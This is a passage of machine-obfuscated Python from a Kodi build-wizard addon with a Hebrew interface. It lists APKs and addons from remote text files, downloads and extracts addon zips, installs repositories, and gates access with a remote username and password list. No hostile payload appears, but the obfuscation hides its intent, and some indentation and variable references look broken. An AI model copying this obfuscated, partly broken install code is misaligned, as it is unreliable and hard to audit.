					OOOO0O00OO0O00O00 =OO0O0O0OO0O0O00OO [2 ]#line:2779
					OO00OOOO000OOO0OO =''#line:2780
				O000OO0O0000O000O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O0OO0O0O00OO [0 ].title (),OO0O0O0OO0O0O00OO [1 ],OO00OOOO000OOO0OO .upper (),OOOO0O00OO0O00O00 ,COLOR2 ,O000000O0O0O0O0OO .replace (' ',''),COLOR1 ,OO0O0OO0OOOOO00O0 )#line:2781
				OO0O0OOOO0O000OO0 =urljoin (O0O000OO00000O000 ,O0OO000OO0OO00000 )#line:2782
				addFile (O000OO0O0000O000O ,'apkinstall',"%s v%s%s %s"%(OO0O0O0OO0O0O00OO [0 ].title (),OO0O0O0OO0O0O00OO [1 ],OO00OOOO000OOO0OO .upper (),OOOO0O00OO0O00O00 ),OO0O0OOOO0O000OO0 )#line:2783
				O0OOO0OO0OOO000OO +=1 #line:2784
			except :#line:2785
				wiz .log ("Error on: %s"%name )#line:2786
		for O0OO000OO0OO00000 ,name ,O000000O0O0O0O0OO ,OO0O0OO0OOOOO00O0 in OO000OOOO0OO00000 :#line:2788
			if O0OO000OO0OO00000 in ['../','old/']:continue #line:2789
			if not O0OO000OO0OO00000 .endswith ('.apk'):continue #line:2790
			if not O0OO000OO0OO00000 .find ('_')==-1 :continue #line:2791
			try :#line:2792
				OO0O0O0OO0O0O00OO =name .split ('-')#line:2793
				O000OO0O0000O000O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0O0OO0O0O00OO [0 ].title (),OO0O0O0OO0O0O00OO [1 ],OO0O0O0OO0O0O00OO [2 ],COLOR2 ,O000000O0O0O0O0OO .replace (' ',''),COLOR1 ,OO0O0OO0OOOOO00O0 )#line:2794
				OO0O0OOOO0O000OO0 =urljoin (OOOO0OOOO0OO0OO0O ,O0OO000OO0OO00000 )#line:2795
				addFile (O000OO0O0000O000O ,'apkinstall',"%s v%s %s"%(OO0O0O0OO0O0O00OO [0 ].title (),OO0O0O0OO0O0O00OO [1 ],OO0O0O0OO0O0O00OO [2 ]),OO0O0OOOO0O000OO0 )#line:2796
				O0OOO0OO0OOO000OO +=1 #line:2797
			except :#line:2798
				wiz .log ("Error on: %s"%name )#line:2799
		if O0OOO0OO0OOO000OO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2800
	elif name =='spmc':#line:2801
		OOO0O000O00OOO00O ='https://github.com/koying/SPMC/releases'#line:2802
		OO000O000OOO00O00 =wiz .openURL (OOO0O000O00OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2803
		O0OOO0OO0OOO000OO =0 #line:2804
		O0OOO0OO0O00O0OOO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO000O000OOO00O00 )#line:2805
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2807
		for name ,OOOOOO0000000OOOO in O0OOO0OO0O00O0OOO :#line:2809
			OOOO00O0O00OO00OO =''#line:2810
			OO000OOOO0OO00000 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOOO0000000OOOO )#line:2811
			for O0OOO000OOO0O0O0O ,OOO000O0O00000OO0 ,O0OOO000OO0O0O0O0 in OO000OOOO0OO00000 :#line:2812
				if O0OOO000OO0O0O0O0 .find ('armeabi')==-1 :continue #line:2813
				if O0OOO000OO0O0O0O0 .find ('launcher')>-1 :continue #line:2814
				OOOO00O0O00OO00OO =urljoin ('https://github.com',O0OOO000OOO0O0O0O )#line:2815
				break #line:2816
		if O0OOO0OO0OOO000OO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2818
def apkMenu (url =None ):#line:2820
	if url ==None :#line:2821
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2824
	if not APKFILE =='http://':#line:2825
		if url ==None :#line:2826
			OOO0O0O0O000OOOO0 =wiz .workingURL (APKFILE )#line:2827
			OOOOO0000OOO00O00 =uservar .APKFILE #line:2828
		else :#line:2829
			OOO0O0O0O000OOOO0 =wiz .workingURL (url )#line:2830
			OOOOO0000OOO00O00 =url #line:2831
		if OOO0O0O0O000OOOO0 ==True :#line:2832
			O00OO0O0OO0OO000O =wiz .openURL (OOOOO0000OOO00O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2833
			OOOOOOO0000OOOO0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OO0O0OO0OO000O )#line:2834
			if len (OOOOOOO0000OOOO0O )>0 :#line:2835
				O000OO00OO00O0OO0 =0 #line:2836
				for O0O0OOOO00000OO00 ,O0000000OO000OO0O ,url ,OO00000000000O000 ,OOO0OO00O0O0OOO00 ,O0OO0000OOO00O0OO ,OO0O00O00O000OO00 in OOOOOOO0000OOOO0O :#line:2837
					if not SHOWADULT =='true'and O0OO0000OOO00O0OO .lower ()=='yes':continue #line:2838
					if O0000000OO000OO0O .lower ()=='yes':#line:2839
						O000OO00OO00O0OO0 +=1 #line:2840
						addDir ("[B]%s[/B]"%O0O0OOOO00000OO00 ,'apk',url ,description =OO0O00O00O000OO00 ,icon =OO00000000000O000 ,fanart =OOO0OO00O0O0OOO00 ,themeit =THEME3 )#line:2841
					else :#line:2842
						O000OO00OO00O0OO0 +=1 #line:2843
						addFile (O0O0OOOO00000OO00 ,'apkinstall',O0O0OOOO00000OO00 ,url ,description =OO0O00O00O000OO00 ,icon =OO00000000000O000 ,fanart =OOO0OO00O0O0OOO00 ,themeit =THEME2 )#line:2844
					if O000OO00OO00O0OO0 <1 :#line:2845
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2846
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2847
		else :#line:2848
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2849
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2850
			addFile ('%s'%OOO0O0O0O000OOOO0 ,'',themeit =THEME3 )#line:2851
		return #line:2852
	else :wiz .log ("[APK Menu] No APK list added.")#line:2853
	setView ('files','viewType')#line:2854
def addonMenu (url =None ):#line:2856
	if not ADDONFILE =='http://':#line:2857
		if url ==None :#line:2858
			OO0OO0O0OOO0OOOOO =wiz .workingURL (ADDONFILE )#line:2859
			O0OO000O0OO0O0O0O =uservar .ADDONFILE #line:2860
		else :#line:2861
			OO0OO0O0OOO0OOOOO =wiz .workingURL (url )#line:2862
			O0OO000O0OO0O0O0O =url #line:2863
		if OO0OO0O0OOO0OOOOO ==True :#line:2864
			O0OOO0O0O0O000O00 =wiz .openURL (O0OO000O0OO0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2865
			OOOO000000OO0O0O0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOO0O0O0O000O00 )#line:2866
			if len (OOOO000000OO0O0O0 )>0 :#line:2867
				O0O00000O00OOO000 =0 #line:2868
				for OO00OO0000OOO00OO ,O00OOOO00O0O0OO0O ,url ,OO00O00O0000000OO ,O00000O0O000OOO0O ,O00000O00OO0000O0 ,O00O00OO0OO0000O0 ,O0OOO0OOO0OOO0000 ,O0OO0O00OOOOOOO0O ,O000OO0O000000OO0 in OOOO000000OO0O0O0 :#line:2869
					if O00OOOO00O0O0OO0O .lower ()=='section':#line:2870
						O0O00000O00OOO000 +=1 #line:2871
						addDir ("[B]%s[/B]"%OO00OO0000OOO00OO ,'addons',url ,description =O000OO0O000000OO0 ,icon =O00O00OO0OO0000O0 ,fanart =O0OOO0OOO0OOO0000 ,themeit =THEME3 )#line:2872
					else :#line:2873
						if not SHOWADULT =='true'and O0OO0O00OOOOOOO0O .lower ()=='yes':continue #line:2874
						try :#line:2875
							OOOO00O0O00O000O0 =xbmcaddon .Addon (id =O00OOOO00O0O0OO0O ).getAddonInfo ('path')#line:2876
							if os .path .exists (OOOO00O0O00O000O0 ):#line:2877
								OO00OO0000OOO00OO ="[COLOR green][Installed][/COLOR] %s"%OO00OO0000OOO00OO #line:2878
						except :#line:2879
							pass #line:2880
						O0O00000O00OOO000 +=1 #line:2881
						addFile (OO00OO0000OOO00OO ,'addoninstall',O00OOOO00O0O0OO0O ,O0OO000O0OO0O0O0O ,description =O000OO0O000000OO0 ,icon =O00O00OO0OO0000O0 ,fanart =O0OOO0OOO0OOO0000 ,themeit =THEME2 )#line:2882
					if O0O00000O00OOO000 <1 :#line:2883
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2884
			else :#line:2885
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2886
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2887
		else :#line:2888
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2889
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2890
			addFile ('%s'%OO0OO0O0OOO0OOOOO ,'',themeit =THEME3 )#line:2891
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2892
	setView ('files','viewType')#line:2893
def addonInstaller (OO0OO0O0OOOO00O00 ,O0OO0OO0OO00O0O00 ):#line:2895
	if not ADDONFILE =='http://':#line:2896
		OOO0O000OOO000O0O =wiz .workingURL (O0OO0OO0OO00O0O00 )#line:2897
		if OOO0O000OOO000O0O ==True :#line:2898
			OOO0OOOOOO00O0OOO =wiz .openURL (O0OO0OO0OO00O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2899
			O0O0OOOOOOO0O000O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OO0O0OOOO00O00 ).findall (OOO0OOOOOO00O0OOO )#line:2900
			if len (O0O0OOOOOOO0O000O )>0 :#line:2901
				for O0OOOO000OOOO00OO ,O0OO0OO0OO00O0O00 ,O00OOOOOOOO0OOOOO ,OO0O0O0O0000O00OO ,O0OOOO0O0O0OO00OO ,O00000OOO0OO0OOOO ,O0O00OO000O0000OO ,O0O000OOOOO0OOO0O ,O0O0OO000OO0O0OO0 in O0O0OOOOOOO0O000O :#line:2902
					if os .path .exists (os .path .join (ADDONS ,OO0OO0O0OOOO00O00 )):#line:2903
						OOOOOO0O00OO0OO0O =['Launch Addon','Remove Addon']#line:2904
						O0O00OOOO000OOO0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOOOO0O00OO0OO0O )#line:2905
						if O0O00OOOO000OOO0O ==0 :#line:2906
							wiz .ebi ('RunAddon(%s)'%OO0OO0O0OOOO00O00 )#line:2907
							xbmc .sleep (1000 )#line:2908
							return True #line:2909
						elif O0O00OOOO000OOO0O ==1 :#line:2910
							wiz .cleanHouse (os .path .join (ADDONS ,OO0OO0O0OOOO00O00 ))#line:2911
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0OO0O0OOOO00O00 ))#line:2912
							except :pass #line:2913
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OO0O0OOOO00O00 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2914
								removeAddonData (OO0OO0O0OOOO00O00 )#line:2915
							wiz .refresh ()#line:2916
							return True #line:2917
						else :#line:2918
							return False #line:2919
					O0OOO0000OO0O00O0 =os .path .join (ADDONS ,O00OOOOOOOO0OOOOO )#line:2920
					if not O00OOOOOOOO0OOOOO .lower ()=='none'and not os .path .exists (O0OOO0000OO0O00O0 ):#line:2921
						wiz .log ("Repository not installed, installing it")#line:2922
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0OO0O0OOOO00O00 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00OOOOOOOO0OOOOO ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2923
							O000000000O0OO0O0 =wiz .parseDOM (wiz .openURL (OO0O0O0O0000O00OO ),'addon',ret ='version',attrs ={'id':O00OOOOOOOO0OOOOO })#line:2924
							if len (O000000000O0OO0O0 )>0 :#line:2925
								OOO000O00O00000OO ='%s%s-%s.zip'%(O0OOOO0O0O0OO00OO ,O00OOOOOOOO0OOOOO ,O000000000O0OO0O0 [0 ])#line:2926
								wiz .log (OOO000O00O00000OO )#line:2927
								if KODIV >=17 :wiz .addonDatabase (O00OOOOOOOO0OOOOO ,1 )#line:2928
								installAddon (O00OOOOOOOO0OOOOO ,OOO000O00O00000OO )#line:2929
								wiz .ebi ('UpdateAddonRepos()')#line:2930
								wiz .log ("Installing Addon from Kodi")#line:2932
								OO00O0OO00O00O0OO =installFromKodi (OO0OO0O0OOOO00O00 )#line:2933
								wiz .log ("Install from Kodi: %s"%OO00O0OO00O00O0OO )#line:2934
								if OO00O0OO00O00O0OO :#line:2935
									wiz .refresh ()#line:2936
									return True #line:2937
							else :#line:2938
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O00OOOOOOOO0OOOOO )#line:2939
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0OO0O0OOOO00O00 ,O00OOOOOOOO0OOOOO ))#line:2940
					elif O00OOOOOOOO0OOOOO .lower ()=='none':#line:2941
						wiz .log ("No repository, installing addon")#line:2942
						O00OOO00OOO0OOO00 =OO0OO0O0OOOO00O00 #line:2943
						OO0OO0O0O000O0O0O =O0OO0OO0OO00O0O00 #line:2944
						installAddon (OO0OO0O0OOOO00O00 ,O0OO0OO0OO00O0O00 )#line:2945
						wiz .refresh ()#line:2946
						return True #line:2947
					else :#line:2948
						wiz .log ("Repository installed, installing addon")#line:2949
						OO00O0OO00O00O0OO =installFromKodi (OO0OO0O0OOOO00O00 ,False )#line:2950
						if OO00O0OO00O00O0OO :#line:2951
							wiz .refresh ()#line:2952
							return True #line:2953
					if os .path .exists (os .path .join (ADDONS ,OO0OO0O0OOOO00O00 )):return True #line:2954
					O0O00000O0O0OO000 =wiz .parseDOM (wiz .openURL (OO0O0O0O0000O00OO ),'addon',ret ='version',attrs ={'id':OO0OO0O0OOOO00O00 })#line:2955
					if len (O0O00000O0O0OO000 )>0 :#line:2956
						O0OO0OO0OO00O0O00 ="%s%s-%s.zip"%(O0OO0OO0OO00O0O00 ,OO0OO0O0OOOO00O00 ,O0O00000O0O0OO000 [0 ])#line:2957
						wiz .log (str (O0OO0OO0OO00O0O00 ))#line:2958
						if KODIV >=17 :wiz .addonDatabase (OO0OO0O0OOOO00O00 ,1 )#line:2959
						installAddon (OO0OO0O0OOOO00O00 ,O0OO0OO0OO00O0O00 )#line:2960
						wiz .refresh ()#line:2961
					else :#line:2962
						wiz .log ("no match");return False #line:2963
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2964
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO0O000OOO000O0O )#line:2965
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2966
def installFromKodi (O0OOO000OO0OO0O0O ,over =True ):#line:2968
	if over ==True :#line:2969
		xbmc .sleep (2000 )#line:2970
	wiz .ebi ('RunPlugin(plugin://%s)'%O0OOO000OO0OO0O0O )#line:2972
	if not wiz .whileWindow ('yesnodialog'):#line:2973
		return False #line:2974
	xbmc .sleep (1000 )#line:2975
	if wiz .whileWindow ('okdialog'):#line:2976
		return False #line:2977
	wiz .whileWindow ('progressdialog')#line:2978
	if os .path .exists (os .path .join (ADDONS ,O0OOO000OO0OO0O0O )):return True #line:2979
	else :return False #line:2980
def installAddon (O00O00OO0O000OO00 ,OOOO0OOO00OO0O0OO ):#line:2982
	if not wiz .workingURL (OOOO0OOO00OO0O0OO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00O00OO0O000OO00 ,COLOR2 ));return #line:2983
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2984
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO0O000OO00 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2985
	O00OOOOOOO0O00O00 =OOOO0OOO00OO0O0OO .split ('/')#line:2986
	OOO0OOO0OO00O0000 =os .path .join (PACKAGES ,O00OOOOOOO0O00O00 [-1 ])#line:2987
	try :os .remove (OOO0OOO0OO00O0000 )#line:2988
	except :pass #line:2989
	downloader .download (OOOO0OOO00OO0O0OO ,OOO0OOO0OO00O0000 ,DP )#line:2990
	OOOO000O000OO0O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00O00OO0O000OO00 )#line:2991
	DP .update (0 ,OOOO000O000OO0O00 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2992
	O0OOOOOO0O0O0OOOO ,O00OOO000OO0OO0O0 ,O0O0OO0OO0000OOO0 =extract .all (OOO0OOO0OO00O0000 ,ADDONS ,DP ,title =OOOO000O000OO0O00 )#line:2993
	DP .update (0 ,OOOO000O000OO0O00 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2994
	installed (O00O00OO0O000OO00 )#line:2995
	installDep (O00O00OO0O000OO00 ,DP )#line:2996
	DP .close ()#line:2997
	wiz .ebi ('UpdateAddonRepos()')#line:2998
	wiz .ebi ('UpdateLocalAddons()')#line:2999
	wiz .refresh ()#line:3000
def installDep (O0O00OO000000O00O ,DP =None ):#line:3002
	OOO00OOO00OO00OOO =os .path .join (ADDONS ,O0O00OO000000O00O ,'addon.xml')#line:3003
	if os .path .exists (OOO00OOO00OO00OOO ):#line:3004
		OO000O0OOO00OO0O0 =open (OOO00OOO00OO00OOO ,mode ='r');OO0OOO0O00OOO00O0 =OO000O0OOO00OO0O0 .read ();OO000O0OOO00OO0O0 .close ();#line:3005
		O00OOOOO000OO0000 =wiz .parseDOM (OO0OOO0O00OOO00O0 ,'import',ret ='addon')#line:3006
		for O00O0O0OOOOOOO0O0 in O00OOOOO000OO0000 :#line:3007
			if not 'xbmc.python'in O00O0O0OOOOOOO0O0 :#line:3008
				if not DP ==None :#line:3009
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0OOOOOOO0O0 ))#line:3010
				wiz .createTemp (O00O0O0OOOOOOO0O0 )#line:3011
def installed (O0OO0O0OOO00O0000 ):#line:3038
	OOO0OO0OOOO0OOO0O =os .path .join (ADDONS ,O0OO0O0OOO00O0000 ,'addon.xml')#line:3039
	if os .path .exists (OOO0OO0OOOO0OOO0O ):#line:3040
		try :#line:3041
			OO0OO0OO000OO0000 =open (OOO0OO0OOOO0OOO0O ,mode ='r');OO000OOO0OO00O00O =OO0OO0OO000OO0000 .read ();OO0OO0OO000OO0000 .close ()#line:3042
			OOO00000OO0O0O0O0 =wiz .parseDOM (OO000OOO0OO00O00O ,'addon',ret ='name',attrs ={'id':O0OO0O0OOO00O0000 })#line:3043
			O0000O0OO000O00O0 =os .path .join (ADDONS ,O0OO0O0OOO00O0000 ,'icon.png')#line:3044
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00000OO0O0O0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0000O0OO000O00O0 )#line:3045
		except :pass #line:3046
def youtubeMenu (url =None ):#line:3048
	if not YOUTUBEFILE =='http://':#line:3049
		if url ==None :#line:3050
			OO00O0O0OOOOO000O =wiz .workingURL (YOUTUBEFILE )#line:3051
			O0O00OOOOO0O0O000 =uservar .YOUTUBEFILE #line:3052
		else :#line:3053
			OO00O0O0OOOOO000O =wiz .workingURL (url )#line:3054
			O0O00OOOOO0O0O000 =url #line:3055
		if OO00O0O0OOOOO000O ==True :#line:3056
			O00OOO0O00OOOO0O0 =wiz .openURL (O0O00OOOOO0O0O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3057
			O0OO0OOO00O0O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00OOO0O00OOOO0O0 )#line:3058
			if len (O0OO0OOO00O0O00OO )>0 :#line:3059
				for O0OOOO0OO0OO000O0 ,O000OO0OOO0000O0O ,url ,OO00O00O000000O00 ,OO0O0O0OO0O0O000O ,OO00OO0O0O00000OO in O0OO0OOO00O0O00OO :#line:3060
					if O000OO0OOO0000O0O .lower ()=="yes":#line:3061
						addDir ("[B]%s[/B]"%O0OOOO0OO0OO000O0 ,'youtube',url ,description =OO00OO0O0O00000OO ,icon =OO00O00O000000O00 ,fanart =OO0O0O0OO0O0O000O ,themeit =THEME3 )#line:3062
					else :#line:3063
						addFile (O0OOOO0OO0OO000O0 ,'viewVideo',url =url ,description =OO00OO0O0O00000OO ,icon =OO00O00O000000O00 ,fanart =OO0O0O0OO0O0O000O ,themeit =THEME2 )#line:3064
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3065
		else :#line:3066
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3067
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3068
			addFile ('%s'%OO00O0O0OOOOO000O ,'',themeit =THEME3 )#line:3069
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3070
	setView ('files','viewType')#line:3071
def STARTP ():#line:3072
	O00O0OO000OOO000O =(ADDON .getSetting ("pass"))#line:3073
	if BUILDNAME =="":#line:3074
	 if not NOTIFY =='true':#line:3075
          O0O0000000OOOOOOO =wiz .workingURL (NOTIFICATION )#line:3076
	 if not NOTIFY2 =='true':#line:3077
          O0O0000000OOOOOOO =wiz .workingURL (NOTIFICATION2 )#line:3078
	 if not NOTIFY3 =='true':#line:3079
          O0O0000000OOOOOOO =wiz .workingURL (NOTIFICATION3 )#line:3080
	O0000O00O000000OO =O00O0OO000OOO000O #line:3081
	O0O0000000OOOOOOO =urllib2 .Request (SPEED )#line:3082
	O0O0OO00O000OO0OO =urllib2 .urlopen (O0O0000000OOOOOOO )#line:3083
	O00O0OO0O00OO00O0 =O0O0OO00O000OO0OO .readlines ()#line:3085
	O00O0O0OO00000O00 =0 #line:3089
	for OO0OOO000O00OO000 in O00O0OO0O00OO00O0 :#line:3090
		if OO0OOO000O00OO000 .split (' ==')[0 ]==O00O0OO000OOO000O or OO0OOO000O00OO000 .split ()[0 ]==O00O0OO000OOO000O :#line:3091
			O00O0O0OO00000O00 =1 #line:3092
			break #line:3093
	if O00O0O0OO00000O00 ==0 :#line:3094
					OO0000O00OOOOO00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3095
					if OO0000O00OOOOO00O :#line:3097
						ADDON .openSettings ()#line:3099
						sys .exit ()#line:3101
					else :#line:3102
						sys .exit ()#line:3103
	return 'ok'#line:3107
def STARTP2 ():#line:3108
	O00OO0O0OO0OO0O0O =(ADDON .getSetting ("user"))#line:3109
	OOO000OOO00O00OOO =(UNAME )#line:3111
	OOO0O0O0OOOOOOO0O =urllib2 .urlopen (OOO000OOO00O00OOO )#line:3112
	OO00OOO00OOOOO0O0 =OOO0O0O0OOOOOOO0O .readlines ()#line:3113
	O000O0OOO000OO000 =0 #line:3114
	for O00OO0OO0OO00OOOO in OO00OOO00OOOOO0O0 :#line:3117
		if O00OO0OO0OO00OOOO .split (' ==')[0 ]==O00OO0O0OO0OO0O0O or O00OO0OO0OO00OOOO .split ()[0 ]==O00OO0O0OO0OO0O0O :#line:3118
			O000O0OOO000OO000 =1 #line:3119
			break #line:3120
	if O000O0OOO000OO000 ==0 :#line:3121
		OO0O0O00O00O0O0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:3122
		if OO0O0O00O00O0O0O0 :#line:3124
			ADDON .openSettings ()#line:3126
			sys .exit ()#line:3129
		else :#line:3130
			sys .exit ()#line:3131
	return 'ok'#line:3135
def passandpin ():#line:3136
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3137
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3138
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3139
def passandUsername ():#line:3140
	ADDON .openSettings ()#line:3142
def folderback ():#line:3145
    O0O0O0O00O0O00OO0 =ADDON .getSetting ("path")#line:3146
    if O0O0O0O00O0O00OO0 :#line:3147
      O0O0O0O00O0O00OO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3148
      ADDON .setSetting ("path",O0O0O0O00O0O00OO0 )#line:3149
def backmyupbuild ():#line:3152
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3156
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3157
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3158
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3161
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3162
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3164
def maintMenu (view =None ):#line:3168
	O00O0OOO0OO0OOOOO ='[B][COLOR green]ON[/COLOR][/B]';O0OO0OO0OOOOO0OOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:3170
	O00OO000O0OOOOOO0 ='true'if AUTOCLEANUP =='true'else 'false'#line:3171
	O00OO0OOO00OO000O ='true'if AUTOCACHE =='true'else 'false'#line:3172
	O000O000O0OOOOOO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:3173
	OOOO00000OOO0OOOO ='true'if AUTOTHUMBS =='true'else 'false'#line:3174
	O00000000OO0O00OO ='true'if SHOWMAINT =='true'else 'false'#line:3175
	O0OO0O000O0O00OO0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:3176
	O00OO000OOO000000 ='true'if INCLUDEALL =='true'else 'false'#line:3177
	O0O0OOO0O000O000O ='true'if THIRDPARTY =='true'else 'false'#line:3178
	if wiz .Grab_Log (True )==False :OOOOO0OO00OOOO000 =0 #line:3179
	else :OOOOO0OO00OOOO000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3180
	if wiz .Grab_Log (True ,True )==False :O000000000OOO00O0 =0 #line:3181
	else :O000000000OOO00O0 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3182
	OOOOOO000000OOOOO =int (OOOOO0OO00OOOO000 )+int (O000000000OOO00O0 )#line:3183
	O00O0000OOO0OO0O0 =str (OOOOOO000000OOOOO )+' Error(s) Found'if OOOOOO000000OOOOO >0 else 'None Found'#line:3184
	O00OOO0OO0O0O0OOO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3185
	if O00OO000OOO000000 =='true':#line:3186
		O0OO00OO000OO0O0O ='true'#line:3187
		O0O00O0OOOOOOOOOO ='true'#line:3188
		O00OOO00O0O000OO0 ='true'#line:3189
		OOOO0OOOO00OO0000 ='true'#line:3190
		OOOOO0O00OO0OO000 ='true'#line:3191
		OOO0OO0000OOO0000 ='true'#line:3192
		OOOOOOOO0OOO0000O ='true'#line:3193
		OO0OO00O000O00OO0 ='true'#line:3194
	else :#line:3195
		O0OO00OO000OO0O0O ='true'if INCLUDEBOB =='true'else 'false'#line:3196
		O0O00O0OOOOOOOOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3197
		O00OOO00O0O000OO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:3198
		OOOO0OOOO00OO0000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:3199
